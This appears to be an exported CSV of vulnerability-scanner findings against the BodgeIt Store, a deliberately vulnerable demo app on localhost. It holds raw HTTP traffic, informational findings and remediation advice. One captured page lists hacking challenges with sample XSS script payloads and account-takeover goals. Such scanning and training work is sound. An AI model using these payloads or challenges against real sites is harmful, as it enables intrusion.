<tr><th>Product</th><th>Quantity</th><th>Price</th><th>Total</th></tr> <tr><td>Total</td><td style=""text-align: center""><input id=""update"" name=""update"" type=""submit"" value=""Update Basket""/></td><td>&nbsp;</td><td align=""right"">$0.00</td></tr> </table> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","31","System Information Leak: External","","Info","Open","2015-10-15","WebInspect","200","Information Exposure","","/bodgeit/contact.jsp","","","http://localhost:8080/bodgeit/contact.jsp","","GET /bodgeit/contact.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/ Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""FC122F65042793B868B42DCF9AD31DFD""; PSID=""C94A4F2D201EA672774C0CF0F9E62874""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""78""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""f916de02-402f-4cb5-971b-b391325660f3""; X-Request-Memo: ID=""6abf5497-0965-4fc4-98ee-7067c1b04313""; sc=""1""; ThreadId=""60""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2352 Date: Thu, 15 Oct 2015 19:10:01 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Contact Us</h3> Please send us your feedback: <br/><br/> <form method=""POST""> <input type=""hidden"" id=""user"" name=""null"" value=""""/> <input type=""hidden"" id=""anticsrf"" name=""anticsrf"" value=""0.16346569660348964""></input> <center> <table> <tr> <td><textarea id=""comments"" name=""comments"" cols=80 rows=8></textarea></td> </tr> <tr> <td><input id=""submit"" type=""submit"" value=""Submit""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","4","System Information Leak: External","","Info","Open","2015-10-15","WebInspect","200","Information Exposure","","/bodgeit/home.jsp","","","http://localhost:8080/bodgeit/home.jsp","","GET /bodgeit/home.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/ Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""39DA4FBE52E8A98EC54D3298C61CAA22""; PSID=""C94A4F2D201EA672774C0CF0F9E62874""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""78""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""8e310cd3-1d7f-4d99-aba3-c1ff3a03f52a""; X-Request-Memo: ID=""2c70a04c-b979-4df0-8d97-f93031d2705c""; sc=""1""; ThreadId=""60""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3256 Date: Thu, 15 Oct 2015 19:10:01 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Our Best Deals!</h3> <center><table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Type</th><th>Price</th></tr> <tr> <td><a href=""product.jsp?prodid=26"">Zip a dee doo dah</a></td><td>Doodahs</td><td align=""right"">$3.99</td> </tr> <tr> <td><a href=""product.jsp?prodid=18"">Whatsit weigh</a></td><td>Whatsits</td><td align=""right"">$2.50</td> </tr> <tr> <td><a href=""product.jsp?prodid=12"">TGJ CCD</a></td><td>Thingamajigs</td><td align=""right"">$2.20</td> </tr> <tr> <td><a href=""product.jsp?prodid=16"">TGJ JJJ</a></td><td>Thingamajigs</td><td align=""right"">$0.80</td> </tr> <tr> <td><a href=""product.jsp?prodid=26"">Zip a dee doo dah</a></td><td>Doodahs</td><td align=""right"">$3.99</td> </tr> <tr> <td><a href=""product.jsp?prodid=14"">TGJ GGG</a></td><td>Thingamajigs</td><td align=""right"">$2.60</td> </tr> <tr> <td><a href=""product.jsp?prodid=21"">Whatsit sound like</a></td><td>Whatsits</td><td align=""right"">$2.90</td> </tr> <tr> <td><a href=""product.jsp?prodid=31"">Youknowwhat</a></td><td>Whatchamacallits</td><td align=""right"">$4.32</td> </tr> <tr> <td><a href=""product.jsp?prodid=30"">Mindblank</a></td><td>Whatchamacallits</td><td align=""right"">$1.00</td> </tr> <tr> <td><a href=""product.jsp?prodid=12"">TGJ CCD</a></td><td>Thingamajigs</td><td align=""right"">$2.20</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","10","System Information Leak: External","","Info","Open","2015-10-15","WebInspect","200","Information Exposure","","/bodgeit/product.jsp","","typeid=[removed]","http://localhost:8080/bodgeit/product.jsp?typeid=[removed]","","GET /bodgeit/product.jsp?typeid=6 HTTP/1.1 Referer: http://localhost:8080/bodgeit/ Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""8CBC7C635C7CF47D60FE3F6743E7E2BC""; PSID=""C94A4F2D201EA672774C0CF0F9E62874""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""80""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""9120c1eb-7a9f-49ff-91de-4b7ba031b01c""; X-Request-Memo: ID=""3e9ada98-673c-4af4-bf32-461683739254""; sc=""1""; ThreadId=""60""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01;b_id=3","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2794 Date: Thu, 15 Oct 2015 19:10:04 GMT <script type=""text/javascript""> function incQuantity () { var q = document.getElementById('quantity'); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity () { var q = document.getElementById('quantity'); if (q != null) { var val = --q.value; if (val < 1) { val = 1; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Products</h3><center><table border=""1"" width=""80%"" class=""border""> <tr><th>Product</th><th>Type</th><th>Price</th></tr> <tr> <td><a href=""product.jsp?prodid=26"">Zip a dee doo dah</a><td>Doodahs</td></td><td align=""right"">$3.99</td> </tr> <tr> <td><a href=""product.jsp?prodid=27"">Doo dah day</a><td>Doodahs</td></td><td align=""right"">$6.50</td> </tr> <tr> <td><a href=""product.jsp?prodid=28"">Bonzo dog doo dah</a><td>Doodahs</td></td><td align=""right"">$2.45</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","35","Email addresses disclosed","","Info","Open","2015-10-15","Burp Suite Pro,WebInspect","200","Information Exposure","","/bodgeit/score.jsp","","","http://localhost:8080/bodgeit/score.jsp","","GET /bodgeit/score.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/about.jsp Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 4058 Date: Mon, 28 Mar 2016 20:11:17 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Score</h3> Here are at least some of the vulnerabilities that you can try and exploit:<br/><br/> <center><table class=""border"" width=""80%""> <tr><th>Challenge</th><th>Done?</th></tr> <tr> <td>Login as test@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Login as user1@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Login as admin@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Find hidden content as a non admin user</td> <td> <img src=""images/152.png"" alt=""Completed"" title=""Completed"" border=""0""> </td> </tr> <tr> <td>Find diagnostic data</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Level 1: Display a popup using: &lt;script&gt;alert(""XSS"")&lt;/script&gt;.</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Level 2: Display a popup using: &lt;script&gt;alert(""XSS"")&lt;/script&gt;</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Access someone elses basket</td> <td> <img src=""images/154.png"" alt=""Not implemented/tested yet :("" title=""Not implemented/tested yet :("" border=""0""> </td> </tr> <tr> <td>Get the store to owe you money</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Change your password via a GET request</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Conquer AES encryption, and display a popup using: &lt;script&gt;alert(""H@cked A3S"")&lt;/script&gt;</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Conquer AES encryption and append a list of table names to the normal results.</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> </table></center> <br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The following email addresses were disclosed in the response:<ul><li>admin@thebodgeitstore.com</li><li>test@thebodgeitstore.com</li><li>user1@thebodgeitstore.com</li></ul> Issue Background: <p>The presence of email addresses within application responses does not necessarily constitute a security vulnerability. Email addresses may appear intentionally within contact information, and many applications (such as web mail) include arbitrary third-party email addresses within their core content.</p> <p>However, email addresses of developers and other individuals (whether appearing on-screen or hidden within page source) may disclose information that is useful to an attacker; for example, they may represent usernames that can be used at the application's login, and they may be used in social engineering attacks against the organization's personnel. Unnecessary or excessive disclosure of email addresses may also lead to an increase in the volume of spam email received.</p>","<p>Consider removing any email addresses that are unnecessary, or replacing personal addresses with anonymous mailbox addresses (such as helpdesk@example.com).</p> <p>To reduce the quantity of spam sent to anonymous mailbox addresses, consider hiding the email address and instead providing a form that generates the email server-side, protected by a CAPTCHA if necessary. </p>","","",""
"DemoApps","","Bodgeit","26","System Information Leak: External","","Info","Open","2015-10-15","WebInspect","200","Information Exposure","","/bodgeit/search.jsp","","","http://localhost:8080/bodgeit/search.jsp","","GET /bodgeit/search.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/ Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""AE7851E50AFD85513BB54F24E68F4737""; PSID=""C94A4F2D201EA672774C0CF0F9E62874""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""79""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""a8a53012-48c1-40b5-bdf0-aed0c734b5d0""; X-Request-Memo: ID=""2b5259be-7c30-47cb-8ced-5ad63cb876f6""; sc=""1""; ThreadId=""57""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01;b_id=3","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2224 Date: Thu, 15 Oct 2015 19:10:03 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Search</h3> <font size=""-1""> <FORM name='query' method='GET'> <table> <tr><td>Search for</td><td><input type='text' name='q'></td></td> <tr><td></td><td><input type='submit' value='Search'/></td></td> <tr><td></td><td><a href='advanced.jsp' style='font-size:9pt;'>Advanced Search</a></td></td> </table> </form> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","97","HTML Comments Sensitive Information Disclosure","","Info","Open","2015-10-15","IBM Security AppScan Standard","615","Information Exposure Through Comments","","/bodgeit/","td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td","","http://localhost/bodgeit/","","GET /bodgeit/ HTTP/1.1 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3213 Date: Thu, 15 Oct 2015 22:24:04 GMT Set-Cookie: JSESSIONID=74278EC797FF1FA855EA3C632039CE05; Path=/bodgeit/; HttpOnly <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Our Best Deals!</h3> <center><table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Type</th><th>Price</th></tr> <tr> <td><a href=""product.jsp?prodid=15"">TGJ HHI</a></td><td>Thingamajigs</td><td align=""right"">$2.10</td> </tr> <tr> <td><a href=""product.jsp?prodid=2"">Complex Widget</a></td><td>Widgets</td><td align=""right"">$3.10</td> </tr> <tr> <td><a href=""product.jsp?prodid=14"">TGJ GGG</a></td><td>Thingamajigs</td><td align=""right"">$2.60</td> </tr> <tr> <td><a href=""product.jsp?prodid=25"">GZ K77</a></td><td>Gizmos</td><td align=""right"">$3.05</td> </tr> <tr> <td><a href=""product.jsp?prodid=13"">TGJ EFF</a></td><td>Thingamajigs</td><td align=""right"">$3.00</td> </tr> <tr> <td><a href=""product.jsp?prodid=22"">GZ XT4</a></td><td>Gizmos</td><td align=""right"">$4.45</td> </tr> <tr> <td><a href=""product.jsp?prodid=30"">Mindblank</a></td><td>Whatchamacallits</td><td align=""right"">$1.00</td> </tr> <tr> <td><a href=""product.jsp?prodid=5"">Thingie 2</a></td><td>Thingies</td><td align=""right"">$3.20</td> </tr> <tr> <td><a href=""product.jsp?prodid=9"">TGJ AAA</a></td><td>Thingamajigs</td><td align=""right"">$0.90</td> </tr> <tr> <td><a href=""product.jsp?prodid=2"">Complex Widget</a></td><td>Widgets</td><td align=""right"">$3.10</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html> GET /bodgeit/js/util.js HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/ Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/""1812-1343669578000"" Last-Modified: Mon, 30 Jul 2012 17:32:58 GMT Content-Type: application/javascript Content-Length: 1812 Date: Thu, 15 Oct 2015 22:20:50 GMT function loadfile(filename){ var filetype = filename.split('.').pop(); switch (filetype){ case ""js"": var insert=document.createElement('script') insert.setAttribute(""type"",""text/javascript"") insert.setAttribute(""src"", filename) break; case 'css': var insert=document.createElement(""link""); insert.setAttribute(""type"", ""text/css"") insert.setAttribute(""href"", filename) insert.setAttribute(""rel"", ""stylesheet"") break; } if (typeof insert!=""...","","AppScan discovered HTML comments containing what appears to be sensitive information.","<fixRecommendations> <fixRecommendation type=""General""> <text>[1] Do not leave any vital information such as filenames or file paths in HTML comments.</text> <text>[2] Remove traces of previous (or future) site links in the production site comments.</text> <text>[3] Avoid placing sensitive information in HTML comments.</text> <text>[4] Make sure that HTML comments do not include source code fragments.</text> <text>[5] Make sure that no vital information was left behind by programmers.</text> </fixRecommendation>","","",""
